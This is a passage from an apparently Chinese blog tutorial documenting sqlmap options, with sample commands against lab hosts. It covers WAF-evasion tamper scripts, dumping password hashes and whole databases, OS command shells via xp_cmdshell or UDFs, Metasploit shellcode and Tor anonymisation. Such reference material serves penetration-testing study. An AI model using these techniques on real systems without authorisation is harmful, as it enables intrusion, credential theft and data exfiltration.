title="参数：–eval"></a>参数：–eval</h3><p>有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用–eval参数在每次请求时根据所写python代码做完修改后请求</p><blockquote><p>python sqlmap.py -u”<a href="http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b&quot;" target="_blank" rel="noopener">http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b&quot;</a> –eval=”import hashlib;hash=hashlib.md5(id).hexdigest()”</p></blockquote><p>请求就是每次请求时根据id参数值，做一次md5后作为hash参数的值</p><h3 id="参数：–auth-type-–auth-cred"><a href="#参数：–auth-type-–auth-cred" class="headerlink" title="参数：–auth-type,–auth-cred"></a>参数：–auth-type,–auth-cred</h3><p>这些参数可以用来登陆HTTP的认证保护支持三种方式：<br>1、Basic<br>2、Digest<br>3、NTLM<br>–auth-cred用于给出身份认证的凭证，格式是“username:password”。</p><blockquote><p>python sqlmap.py -u “<a href="http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot;" target="_blank" rel="noopener">http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot;</a> –auth-type Basic –auth-cred “testuser:testpass”</p></blockquote><h3 id="参数：–proxy-–proxy-cred和–ignore-proxy"><a href="#参数：–proxy-–proxy-cred和–ignore-proxy" class="headerlink" title="参数：–proxy,–proxy-cred和–ignore-proxy"></a>参数：–proxy,–proxy-cred和–ignore-proxy</h3><p>使用–proxy代理是格式为：<a href="http://url:port。" target="_blank" rel="noopener">http://url:port。</a><br>当HTTP(S)代理需要认证是可以使用–proxy-cred参数：username:password。<br>–ignore-proxy拒绝使用本地局域网的HTTP(S)代理</p><p>参数：–auth-cert<br>Web服务器需要客户端证书进行身份验证时，需要提供两个文件:key_file，cert_file。<br>key_file是格式为PEM文件，包含着你的私钥，cert_file是格式为PEM的连接文件</p><h3 id="参数：–ignore-401"><a href="#参数：–ignore-401" class="headerlink" title="参数：–ignore-401"></a>参数：–ignore-401</h3><p>使用该参数忽略 401 错误（未认证</p><h3 id="参数：–tor、–tor-type、–tor-port-和–check-tor"><a href="#参数：–tor、–tor-type、–tor-port-和–check-tor" class="headerlink" title="参数：–tor、–tor-type、–tor-port 和–check-tor"></a>参数：–tor、–tor-type、–tor-port 和–check-tor</h3><p>安装类似 Privoxy 这样的软件按照Tor 的安装指导配置一个 Tor 客户端。设置好后使用参数“–tor”让 Sqlmap 自动设置使用 Tor 代理<br>如果想要手动指定 Tor 的类型和端口可以使用参数“–tor-type”和“–tor-port”<br>如果要求高度的匿名性可以使用参数“–check-tor”，加上该参数后 Sqlmap 会确保所有流量都走 Tor 代理，若 Tor 代理失效，Sqlmap 会发出警告并退出。检测方法是访问Are you using Tor?</p><h3 id="参数：–force-ssl"><a href="#参数：–force-ssl" class="headerlink" title="参数：–force-ssl"></a>参数：–force-ssl</h3><p>强制使用 SSL</p><h2 id="Optimization（优化"><a href="#Optimization（优化" class="headerlink" title="Optimization（优化)"></a>Optimization（优化)</h2><p>可用于优化SqlMap的性能</p><h3 id="参数：-o"><a href="#参数：-o" class="headerlink" title="参数：-o"></a>参数：-o</h3><p>开启所有优化开关,添加此参数相当于同时添加下列三个优化参数：<br>–keep-alive<br>–null-connection<br>–threads=3 </p><h3 id="参数：–keep-alive"><a href="#参数：–keep-alive" class="headerlink" title="参数：–keep-alive"></a>参数：–keep-alive</h3><p>该参数让 Sqlmap 使用 HTTP 长连接。该参数与“–proxy”矛盾</p><h3 id="参数：–null-connection"><a href="#参数：–null-connection" class="headerlink" title="参数：–null-connection"></a>参数：–null-connection</h3><p>有一种特殊的 HTTP 请求类型可以直接获得 HTTP 响应的大小而不用获得 HTTP 响应体。显然这在布尔型盲注中可以节约很大的带宽。当然这一技术是需要服务器端支持的。该参数与“–text-only”矛盾。</p><h3 id="参数：–threads"><a href="#参数：–threads" class="headerlink" title="参数：–threads"></a>参数：–threads</h3><p>使用该参数指定 Sqlmap 可以达到的最大并发数。从性能和网站承受能力两方面考虑最大并发数不要超过 10(默认1)</p><h2 id="Injection（注入）"><a href="#Injection（注入）" class="headerlink" title="Injection（注入）"></a>Injection（注入）</h2><h3 id="参数：-p-和–skip"><a href="#参数：-p-和–skip" class="headerlink" title="参数：-p 和–skip"></a>参数：-p 和–skip</h3><p>默认情况下 Sqlmap 会测试所有 GET 参数和 POST 参数，当 level 大于等于 2 时会测试 cookie 参数，当 level 大于等于 3 时会测试 User-Agent 和 Referer。实际上还可以手动指定一个以逗号分隔的、要测试的参数列表，该列表中的参数不受 level 限制。这就是“-p”的作用。<br>但是你可以手动用-p参数设置想要测试的参数。<br>例如： -p “id,user-anget”<br>当你使用–level的值很大但是有个别参数不想测试的时候可以使用–skip参数<br>例如：–skip=”user-angent.referer”<br>有时会遇到伪静态网页。像动态网页会明目张胆地列出参数，如：</p><blockquote><p>/user.php?id=1</p></blockquote><p>显然参数是 id，值为 1。但若是伪静态网页则可能这样写：</p><blockquote><p>/user/1/</p></blockquote><p>将参数隐藏在 URL 中。通常情况下 Sqlmap 不会对这样的伪静态网页的参数做测试，因为 Sqlmap 无法判断哪个是参数。若想要对这样的伪静态进行测试，只需要加上“*”，告诉 Sqlmap 哪个是伪静态参数就行，剩下事的和 GET 参数没有什么区别。如：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap<span class="selector-class">.py</span> -u <span class="string">"http(s)://target.cc/user/1*/"</span></span><br></pre></td></tr></table></figure></p><h3 id="参数：–dbms"><a href="#参数：–dbms" class="headerlink" title="参数：–dbms"></a>参数：–dbms</h3><p>默认情况系sqlmap会自动的探测web应用后端的数据库是什么，sqlmap支持的数据库有</p><ul><li>MySQL、</li><li>Oracle</li><li>PostgreSQL</li><li>Microsoft SQL Server</li><li>Microsoft Access</li><li>SQLite</li><li>Firebird</li><li>Sybase</li><li>SAP MaxDB</li><li>DB2</li></ul><p>对于 Mysql 和 Microsoft SQL Server 和要这样指定：</p><ul><li>–dbms MySQL <version></version></li><li>–dbms Microsoft SQL Server <version></version></li></ul><p>对于 MySQL 来说，是类似这样的：5.0。对于 Microsoft SQL Server 来说，是类似这样的：2005。<br>如果在添加“–dbms”参数的同时还添加了“–fingerprint”，Sqlmap 只会在指定的数据库管理系统内进行指纹识别。<br>只有在很确定时使用“–dbms”，否则还是让 Sqlmap 自动检测更好些</p><h3 id="参数：–os"><a href="#参数：–os" class="headerlink" title="参数：–os"></a>参数：–os</h3><p>默认情况下sqlmap会自动的探测数据库服务器系统，支持的系统有：</p><ul><li>Linux</li><li>Windows</li></ul><h3 id="参数：–invalid-bignum"><a href="#参数：–invalid-bignum" class="headerlink" title="参数：–invalid-bignum"></a>参数：–invalid-bignum</h3><p>当你想指定一个报错的数值时，可以使用这个参数，例如默认情况系id=13，sqlmap会变成id=-13来报错，你可以指定比如id=9999999来报错</p><h3 id="参数：–invalid-logical"><a href="#参数：–invalid-logical" class="headerlink" title="参数：–invalid-logical"></a>参数：–invalid-logical</h3><p>原因同上，可以指定id=13把原来的id=-13的报错改成id=13 AND 18=19</p><h3 id="参数：–prefix-–suffix"><a href="#参数：–prefix-–suffix" class="headerlink" title="参数：–prefix,–suffix"></a>参数：–prefix,–suffix</h3><p>需要在注入的payload的前面或者后面加一些字符，来保证payload的正常执行<br>代码中是这样调用数据库的:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query = "<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=(’<span class="string">" . $_GET[’id’] . "</span>’) <span class="keyword">LIMIT</span> <span class="number">0</span>, <span class="number">1</span><span class="string">";</span></span><br></pre></td></tr></table></figure></p><p>这时你就需要–prefix和–suffix参数了<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1"</span> -<span class="selector-tag">p</span> id --prefix <span class="string">"’)"</span> --suffix <span class="string">"AND (’abc’=’abc"</span></span><br></pre></td></tr></table></figure></p><p>这样执行的SQL语句变成：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query = "<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=(’<span class="number">1</span>’) &lt;PAYLOAD&gt; <span class="keyword">AND</span> (’abc’=’abc’) <span class="keyword">LIMIT</span> <span class="number">0</span>, <span class="number">1</span><span class="string">";</span></span><br></pre></td></tr></table></figure></p><h3 id="参数：–tamper"><a href="#参数：–tamper" class="headerlink" title="参数：–tamper"></a>参数：–tamper</h3><p>sqlmap除了使用CHAR()函数来防止出现单引号之外没有对注入的数据修改，你可以使用–tamper参数对数据做修改来绕过WAF等设备。<br>若该 tamper 脚本位于 sqlmap 的安装目录的 tamper/目录中，就可以省略路径和后缀名，只写文件名。<br>多个 tamper 脚本之间用空格隔开<br>在 tamper/目录中有许多可用的 tamper 脚本。tamper 脚本的作用是对 payload 进行混淆。<br>我们还可以自己写 tamper 脚本，这属于 Sqlmap 的高级用法，一个有效的 tamper 脚本如下所示：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 必须要导入的库</span></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="comment"># 定义该 tamper 脚本的优先级</span></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload)</span>:</span></span><br><span class="line">    <span class="string">'''此处是 tamper 的说明'''</span></span><br><span class="line">    retVal = payload</span><br><span class="line">    <span class="comment"># 此处是用于修改 payload 的代码</span></span><br><span class="line">    <span class="comment"># 返回修改后的 payload</span></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure></p><h3 id="参数：–no-escape"><a href="#参数：–no-escape" class="headerlink" title="参数：–no-escape"></a>参数：–no-escape</h3><p>有时 Sqlmap 会使用用单引号括起来的字符串值作为 payload，如“SELECT ‘foobar’”，默认地这些值会被编码，如上例将被编码为：<br>SELECT CHAR(102)+CHAR(111)+CHAR(111)+CHAR(98)+CHAR(97)+CHAR(114)) 这样做既可以混淆视听让人一时难以洞察 payload 的内容又可以在后台服务器使用类似 magic_quote 或 mysql_real_escape_string 这样的转义函数的情况下字符串不受影响。当然在某些情况下需要关闭字符串编码，如为了缩减 payload 长度，用户可以使用“–no-escape”来关闭字符串编码。</p><h2 id="Detection（检测）"><a href="#Detection（检测）" class="headerlink" title="Detection（检测）"></a>Detection（检测）</h2><p>可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容<br>参数：–level<br>共有五个等级，默认为1，sqlmap使用的payload可以在xml/payloads.xml中看到，你也可以根据相应的格式添加自己的payload<br>这个参数不仅影响使用哪些payload同时也会影响测试的注入点，GET和POST的数据都会测试，HTTP Cookie在level为2的时候就会测试，HTTP User-Agent/Referer头在level为3的时候就会测试</p><h3 id="参数：–risk"><a href="#参数：–risk" class="headerlink" title="参数：–risk"></a>参数：–risk</h3><p>此参数用于指定风险等级，有 1~4 共 4 级。</p><ul><li>1会测试大部分的测试语句(默认)</li><li>2会增加基于事件的测试语句</li><li>3会增加OR语句的SQL注入测试。<br>在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险</li></ul><h3 id="参数：–string-–not-string-–regexp-–code"><a href="#参数：–string-–not-string-–regexp-–code" class="headerlink" title="参数：–string,–not-string,–regexp,–code"></a>参数：–string,–not-string,–regexp,–code</h3><p>页面比较：默认情况下sqlmap通过判断返回页面的不同来判断真假，但有时候这会产生误差，因为有的页面在每次刷新的时候都会返回不同的代码，比如页面当中包含一个动态的广告或者其他内容，这会导致sqlmap的误判。此时用户可以提供一个字符串或者一段正则匹配，在原始页面与真条件下的页面都存在的字符串，而错误页面中不存在（使用–string参数添加字符串，–regexp添加正则），同时用户可以提供一段字符串在原始页面与真条件下的页面都不存在的字符串，而错误页面中存在的字符串（–not-string添加）。用户也可以提供真与假条件返回的HTTP状态码不一样来注入，<br>例如，响应200的时候为真，响应401的时候为假，可以添加参数–code=200</p><h3 id="参数：–text-only-–titles"><a href="#参数：–text-only-–titles" class="headerlink" title="参数：–text-only,–titles"></a>参数：–text-only,–titles</h3><p>若是用户知道代表 True 的页面 title 和代表 False 的页面 title 不同，<br>如代表 True 的页面 title 为“Welcome”，代表 False 的页面 title 为“Forbidden”，<br>–titles”让 Sqlmap 依据 title 来判断 True 或 False<br>若是 HTTP 响应体中有许多诸如 JavaScript 之类的活动内容，可以使用–text-only让 Sqlmap 只专注于纯文本内容</p><h2 id="Techniques（技巧）"><a href="#Techniques（技巧）" class="headerlink" title="Techniques（技巧）"></a>Techniques（技巧）</h2><p>这些选项可用于调整具体的SQL注入测试。<br>B：Boolean-based blind（布尔型注入）<br>E：Error-based（报错型注入）<br>U：Union query-based（可联合查询注入）<br>S：Stacked queries（可多语句查询注入）<br>T：Time-based blind（基于时间延迟注入）<br>Q：Inline queries（嵌套查询注入）<br>可以用“–technique ES”来指定使用两种检测技术。“–technique BEUSTQ”与默认情况等效</p><h2 id="Fingerprint（指纹）："><a href="#Fingerprint（指纹）：" class="headerlink" title="Fingerprint（指纹）："></a>Fingerprint（指纹）：</h2><h3 id="参数-f"><a href="#参数-f" class="headerlink" title="参数 -f"></a>参数 -f</h3><p>–fingerprint 执行检查广泛的DBMS版本指纹</p><h2 id="Enumeration（枚举）："><a href="#Enumeration（枚举）：" class="headerlink" title="Enumeration（枚举）："></a>Enumeration（枚举）：</h2><p>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句</p><h3 id="参数：-b"><a href="#参数：-b" class="headerlink" title="参数：-b"></a>参数：-b</h3><p>–banner 检索数据库管理系统的标识<br>大多数的现代数据库管理系统都有一个函数或是环境变量能够返回数据库管理系统的版本号和最后的补丁级别以及底层的操作系统信息。<br>通常这个函数是 version()、环境变量是@@version，当然要看目标数据库管理系统了。使用参数“-b”或“–banner”来列举数据库管理系统的这一信息</p><h3 id="–current-user"><a href="#–current-user" class="headerlink" title="–current-user"></a>–current-user</h3><p>检索数据库管理系统当前用户</p><h3 id="–current-db"><a href="#–current-db" class="headerlink" title="–current-db"></a>–current-db</h3><p>检索数据库管理系统当前数据库</p><h3 id="–is-dba"><a href="#–is-dba" class="headerlink" title="–is-dba"></a>–is-dba</h3><p>检测DBMS当前用户是否DBA</p><h3 id="–users"><a href="#–users" class="headerlink" title="–users"></a>–users</h3><p>枚举数据库管理系统用户</p><h3 id="–passwords"><a href="#–passwords" class="headerlink" title="–passwords"></a>–passwords</h3><p>枚举数据库管理系统用户密码哈希</p><h3 id="–privileges"><a href="#–privileges" class="headerlink" title="–privileges"></a>–privileges</h3><p>枚举数据库管理系统用户的权限<br>当前用户有读取包含了数据库管理系统中用户信息的系统表的权限时使用这一参数可以列举数据库管理系统中用户的权限。通过用户权限可以判断哪些用户是管理员。<br><img src="http://picture.manhao6.cn/sql注入与sqlmap实践/20190418042800199.png" alt><br>若想只枚举特定用户的权限使用参数“-U”指定用户，可用“CU”来代表当前用户。<br>若目标是微软的 SQL Server，这一参数会列出每个用户是否是管理员而不列出每个用户的具体权限。</p><h3 id="–roles"><a href="#–roles" class="headerlink" title="–roles"></a>–roles</h3><p>枚举数据库管理系统用户的角色<br>当前用户有读取包含了数据库管理系统中用户信息的系统表的权限时使用这一参数可以列举数据库管理系统中用户的角色。<br>若想只枚举特定用户的角色使用参数“-U”指定用户，可用“CU”来代表当前用户。<br>官方手册上说只有目标数据库管理系统是 Oracle 时这一功能才可用，但我在 Mysql 中测试也是可用的</p><h3 id="–dbs"><a href="#–dbs" class="headerlink" title="–dbs"></a>–dbs</h3><p>枚举数据库管理系统数据库<br>当前用户有读取包含了数据库管理系统中可用数据库信息的系统表的权限时使用这一参数可以列举数据库管理系统中所有数据库<br><img src="http://picture.manhao6.cn/sql注入与sqlmap实践/20190418043044906.png" alt></p><h3 id="–tables"><a href="#–tables" class="headerlink" title="–tables"></a>–tables</h3><p>枚举的DBMS数据库中的表<br>没有用参数“-D”指定数据库，只使用参数“–tables”会列举所有数据库中所有表<br>使用参数“–exclude-sysdbs”可排除系统数据库。在 Oracle 中要指定 TABLESPACE_NAME 而不是数据库名<br><img src="http://picture.manhao6.cn/sql注入与sqlmap实践/20190418043222137.png" alt></p><h3 id="–columns"><a href="#–columns" class="headerlink" title="–columns"></a>–columns</h3><p>枚举DBMS数据库表列<br><img src="http://picture.manhao6.cn/sql注入与sqlmap实践/20190418043600565.png" alt></p><h3 id="–dump"><a href="#–dump" class="headerlink" title="–dump"></a>–dump</h3><p>-C、-T、-D、–start、–stop 和–where<br>权限允许时可以列举表中数据。用参数“-D”指定数据库，用参数“-T”指定数据表，用参数“-C”指定目标列。<br>若只指定了数据表而没有指定数据库则默认使用当前数据库，若没有指定列则列举表中全部列。<br>数据保存到 CSV 格式文件中，文件具体路径会在 Sqlmap 的输出中给出</p><h3 id="–dump-all"><a href="#–dump-all" class="headerlink" title="–dump-all"></a>–dump-all</h3><p>使用参数“–dump-all”可列举所有数据库所有表中所有数据。同样地，可使用参数“–exclude-sysdbs”排除系统数据库。</p><ul><li>注意微软 SQL Server 的 master 数据库不属于系统数据库，因为有些管理员会在这个数据库中存储用户数据<h3 id="–search"><a href="#–search" class="headerlink" title="–search"></a>–search</h3>搜索列（S），表（S）和/或数据库名称（S）<h3 id="D-DB"><a href="#D-DB" class="headerlink" title="-D DB"></a>-D DB</h3>要进行枚举的数据库名<h3 id="T-TBL"><a href="#T-TBL" class="headerlink" title="-T TBL"></a>-T TBL</h3>要进行枚举的数据库表<h3 id="C-COL"><a href="#C-COL" class="headerlink" title="-C COL"></a>-C COL</h3>要进行枚举的数据库列<h3 id="U-USER"><a href="#U-USER" class="headerlink" title="-U USER"></a>-U USER</h3>用来进行枚举的数据库用户<h3 id="–exclude-sysdbs"><a href="#–exclude-sysdbs" class="headerlink" title="–exclude-sysdbs"></a>–exclude-sysdbs</h3>枚举表时排除系统数据库<h3 id="–start-LIMITSTART"><a href="#–start-LIMITSTART" class="headerlink" title="–start=LIMITSTART"></a>–start=LIMITSTART</h3>第一个查询输出进入检索<h3 id="–stop-LIMITSTOP"><a href="#–stop-LIMITSTOP" class="headerlink" title="–stop=LIMITSTOP"></a>–stop=LIMITSTOP</h3>最后查询的输出进入检索<h3 id="–first-FIRSTCHAR"><a href="#–first-FIRSTCHAR" class="headerlink" title="–first=FIRSTCHAR"></a>–first=FIRSTCHAR</h3>第一个查询输出字的字符检索<h3 id="–last-LASTCHAR"><a href="#–last-LASTCHAR" class="headerlink" title="–last=LASTCHAR"></a>–last=LASTCHAR</h3>最后查询的输出字字符检索<h3 id="–sql-query-QUERY"><a href="#–sql-query-QUERY" class="headerlink" title="–sql-query=QUERY"></a>–sql-query=QUERY</h3>要执行的SQL语句<h3 id="–sql-shell"><a href="#–sql-shell" class="headerlink" title="–sql-shell"></a>–sql-shell</h3>提示交互式SQL的shell</li></ul><p>##Brute force（蛮力）：<br>这些选项可以被用来运行蛮力检查。</p><h3 id="–common-tables-检查存在共同表"><a href="#–common-tables-检查存在共同表" class="headerlink" title="–common-tables 检查存在共同表"></a>–common-tables 检查存在共同表</h3><h3 id="–common-columns-检查存在共同列"><a href="#–common-columns-检查存在共同列" class="headerlink" title="–common-columns 检查存在共同列"></a>–common-columns 检查存在共同列</h3><h2 id="User-defined-function-injection（用户自定义函数注入）："><a href="#User-defined-function-injection（用户自定义函数注入）：" class="headerlink" title="User-defined function injection（用户自定义函数注入）："></a>User-defined function injection（用户自定义函数注入）：</h2><p>这些选项可以用来创建用户自定义函数。</p><h3 id="–udf-inject-注入用户自定义函数"><a href="#–udf-inject-注入用户自定义函数" class="headerlink" title="–udf-inject 注入用户自定义函数"></a>–udf-inject 注入用户自定义函数</h3><h3 id="–shared-lib-SHLIB-共享库的本地路径"><a href="#–shared-lib-SHLIB-共享库的本地路径" class="headerlink" title="–shared-lib=SHLIB 共享库的本地路径"></a>–shared-lib=SHLIB 共享库的本地路径</h3><h2 id="File-system-access（访问文件系统）："><a href="#File-system-access（访问文件系统）：" class="headerlink" title="File system access（访问文件系统）："></a>File system access（访问文件系统）：</h2><p>这些选项可以被用来访问后端数据库管理系统的底层文件系统。</p><h3 id="–file-read-RFILE"><a href="#–file-read-RFILE" class="headerlink" title="–file-read=RFILE"></a>–file-read=RFILE</h3><p>从后端的数据库管理系统文件系统读取文件<br>当数据库管理系统是 MySQL、PostgreSQL 或微软的 SQL Server 且当前用户有读取文件相关权限时读取文件是可行的</p><h3 id="–file-write-WFILE-–file-dest-DFILE"><a href="#–file-write-WFILE-–file-dest-DFILE" class="headerlink" title="–file-write=WFILE   –file-dest=DFILE"></a>–file-write=WFILE   –file-dest=DFILE</h3><p>file-write编辑后端的数据库管理系统文件系统上的本地文件<br>file-dest后端的数据库管理系统写入文件的绝对路径<br>当数据库管理系统是 MySQL、PostgreSQL 或微软的 SQL Server 且当前用户有写文件相关权限时上传文件是可行的。<br>上传的文件既可以是文件文件也可以是二进制文件.</p><p>### </p><h2 id="Operating-system-access（操作系统访问）："><a href="#Operating-system-access（操作系统访问）：" class="headerlink" title="Operating system access（操作系统访问）："></a>Operating system access（操作系统访问）：</h2><p>这些选项可以用于访问后端数据库管理系统的底层操作系统。</p><h3 id="–os-cmd-OSCMD-–os-shell"><a href="#–os-cmd-OSCMD-–os-shell" class="headerlink" title="–os-cmd=OSCMD  –os-shell"></a>–os-cmd=OSCMD  –os-shell</h3><p>执行操作系统命令(若数据库管理系统是 MySQL、PostgreSQL 或微软的 SQL Server 且当前用户有相关权限 Sqlmap 就能利用 SQL 注入执行任意的操作系统命令)<br>当数据库管理系统是 MySQL 或 PostgreSQL 时，Sqlmap 会通过前面介绍过的文件上传功能上传一个包含用户自定义函数 sys_exec()和 sys_eval()的二进制共享库文件，然后创建这两个用户自定义函数，通过这两个函数之一来执行用户指定的命令。选择哪个函数取决于用户是否想要显示命令执行的标准输出<br>当数据库管理系统是微软的 SQL Server 时，Sqlmap 通过存储过程 xp_cmdshell 来执行任意命令。<br>若 xp_cmdshell 被禁用（SQL Server &gt;= 2005 时默认禁用）Sqlmap 会启用它；<br>若 xp_cmdshell 不存在，Sqlmap 会创建它。</p><p>当用户想要看到命令执行的标准输出时，Sqlmap 使用可列举的注入技术（盲注、带内和基于错误的注入），而当用户不想看到命令执行的标准输出时，堆查询注入技术将被用于执行命令</p><h3 id="–os-pwn-–os-bof-–os-smbrelay"><a href="#–os-pwn-–os-bof-–os-smbrelay" class="headerlink" title="–os-pwn –os-bof  –os-smbrelay"></a>–os-pwn –os-bof  –os-smbrelay</h3><p>os-pwn获取一个OOB shell，meterpreter或VNC<br>os-bof一键获取一个OOB shell，meterpreter或VNC<br>os-smbrelay存储过程缓冲区溢出利用</p><h3 id="–priv-esc"><a href="#–priv-esc" class="headerlink" title="–priv-esc"></a>–priv-esc</h3><p>数据库进程用户权限提升</p><h3 id="–msf-path-MSFPATH"><a href="#–msf-path-MSFPATH" class="headerlink" title="–msf-path=MSFPATH"></a>–msf-path=MSFPATH</h3><p>Metasploit Framework本地的安装路径</p><h3 id="–tmp-path-TMPPATH"><a href="#–tmp-path-TMPPATH" class="headerlink" title="–tmp-path=TMPPATH"></a>–tmp-path=TMPPATH</h3><p>远程临时文件目录的绝对路径<br>若数据库管理系统是 MySQL、PostgreSQL 或微软的 SQL Server 且当前用户有相关权限 Sqlmap 就有可能在攻击者的主机和数据库所在主机之间建立带外 TCP 连接。根据用户的选择，此连接可以是交互式命令 shell，Meterpreter 会话或图形用户界面（VNC）会话。</p><p>Sqlmap 要靠 Metasploit 生成 shellcode，在数据库所在主机执行 shellcode 有以下四种技术：</p><p>数据库通过 Sqlmap 创建的用户自定义函数 sys_bineval()在内存中执行 Metasploit 的 shellcode。支持 MySQL 和 PostgreSQL。参数“–os-pwn”。<br>通过 Sqlmap 自己的用户自定义函数（MySQL 和 PostgreSQL 中的 sys_exec()，微软 SQL Server 中的 xp_cmdshell()）上传并执行 Metasploit 的“stand-alone payload stager”。参数：“–os-pwn”。<br>利用远程代码执行漏洞MS08-068。攻击者的机器要用 Metasploit 的 smb_relay 监听来自目标机器的连接。要求在 Linux/Unix 上以 root 权限运行 Sqlmap 且目标 DBMS 在 Windows 上以管理员权限运行。参数：“–os-smbrelay”。<br>在微软 SQL Server 2000 和 2005 中可通过存储过程 sp_replwritetovarbin 的堆缓冲区溢出漏洞（MS09-004）在内存中执行 Metasploit 的 shellcode。Sqlmap 有自己的数据执行保护绕过技术可以成功利用漏洞，但需要 Metasploit 生成 shellcode 以便在成功利用漏洞时执行 shellcode。参数：“–os-bof</p><h2 id="Windows注册表访问："><a href="#Windows注册表访问：" class="headerlink" title="Windows注册表访问："></a>Windows注册表访问：</h2><p>这些选项可以被用来访问后端数据库管理系统Windows注册表。</p><p>–reg-read 读一个Windows注册表项值<br>–reg-add 写一个Windows注册表项值数据<br>–reg-del 删除Windows注册表键值<br>–reg-key=REGKEY Windows注册表键<br>–reg-value=REGVAL Windows注册表项值<br>–reg-data=REGDATA Windows注册表键值数据<br>–reg-type=REGTYPE Windows注册表项值类型</p><h2 id="General（一般）："><a href="#General（一般）：" class="headerlink" title="General（一般）："></a>General（一般）：</h2><p>这些选项可以用来设置一些一般的工作参数。<br>sqlite会话文件保存位置</p><ul><li>-s SESSIONFILE      Load session from a stored (.sqlite) file  </li></ul><p>记录流量文件保存文件</p><ul><li>-t TRAFFICFILE      Log all HTTP traffic into a textual file  </li></ul><p>永远不要求用户输入，使用默认行为</p><ul><li>–batch             Never ask for user input, use the default behavior  </li></ul><p>具有二进制值的结果字段</p><ul><li>–binary-fields=..  Result fields having binary values (e.g. “digest”)  </li></ul><p>在评估目标之前检查Internet连接</p><ul><li>–check-internet    Check Internet connection before assessing the target  </li></ul><p>从目标网址开始抓取网站</p><ul><li>–crawl=CRAWLDEPTH  Crawl the website starting from the target URL  </li></ul><p>正则表达式从抓取中排除页面（例如“logout”）</p><ul><li>–crawl-exclude=..  Regexp to exclude pages from crawling (e.g. “logout”)  </li></ul><p>分隔CSV输出中使用的字符（默认为“，”）</p><ul><li>–csv-del=CSVDEL    Delimiting character used in CSV output (default “,”)  </li></ul><p>盲SQL注入字符集（例如“0123456789abcdef”）</p><ul><li>–charset=CHARSET   Blind SQL injection charset (e.g. “0123456789abcdef”)  </li></ul><p>转储数据的格式（CSV（默认），HTML或SQLITE）</p><ul><li>–dump-format=DU..  Format of dumped data (CSV (default), HTML or SQLITE)  </li></ul><p>用于数据检索的字符编码（例如GBK）</p><ul><li>–encoding=ENCOD..  Character encoding used for data retrieval (e.g. GBK)  </li></ul><p>显示每个输出的预计到达时间</p><ul><li>–eta               Display for each output the estimated time of arrival  </li></ul><p>刷新当前目标的会话文件</p><ul><li>–flush-session     Flush session files for current target  </li></ul><p>在目标URL上解析和测试表单</p><ul><li>–forms             Parse and test forms on target URL  </li></ul><p>忽略存储在会话文件中的查询结果,重新进行数据查询</p><ul><li>–fresh-queries     Ignore query results stored in session file  </li></ul><p>将所有HTTP流量记录到HAR文件中</p><ul><li>–har=HARFILE       Log all HTTP traffic into a HAR file  </li></ul><p>在数据检索期间使用十六进制转,检索结束后会转换回原来数据格式.</p><ul><li>–hex               Use hex conversion during data retrieval  </li></ul><p>自定义输出目录路径</p><ul><li>–output-dir=OUT..  Custom output directory path  </li></ul><p>分析和实现数据库内建报错信息</p><ul><li>–parse-errors      Parse and display DBMS error messages from responses  </li></ul><p>将命令保存成配置文件</p><ul><li>–save=SAVECONFIG   Save options to a configuration INI file  </li></ul><p>正则表达式从提供的代理日志中过滤目标</p><ul><li>–scope=SCOPE       Regexp to filter targets from provided proxy log  </li></ul><p>若只想使用包含关键词“ROW”的payload可使用参数“–test-filter=ROW”</p><ul><li>–test-filter=TE..  Select tests by payloads and/or titles (e.g. ROW)  </li></ul><p>若不想使用包含关键词“BENCHMARK”的payload可使用参数“–test-skip=BENCHMARK”</p><ul><li>–test-skip=TEST..  Skip tests by payloads and/or titles (e.g. BENCHMARK)  </li></ul><p>更新sqlmap</p><ul><li>–update            Update sqlmap</li></ul><h2 id="Miscellaneous（杂项）："><a href="#Miscellaneous（杂项）：" class="headerlink" title="Miscellaneous（杂项）："></a>Miscellaneous（杂项）：</h2><p>使用短助记符（例如“flu，bat，ban，tec = EU”）</p><ul><li>-z MNEMONICS        Use short mnemonics (e.g. “flu,bat,ban,tec=EU”)  </li></ul><p>在找到SQL注入时运行主机OS命令</p><ul><li>–alert=ALERT       Run host OS command(s) when SQL injection is found  </li></ul><p>设置预定义答案（例如“quit = N，follow = N”）</p><ul><li>–answers=ANSWERS   Set predefined answers (e.g. “quit=N,follow=N”)  </li></ul><p>当发现SQL注入时,发出问题提示音</p><ul><li>–beep              Beep on question and/or when SQL injection is found  </li></ul><p>清除sqlmap注入时产生的udf与表</p><ul><li>–cleanup           Clean up the DBMS from sqlmap specific UDF and tables  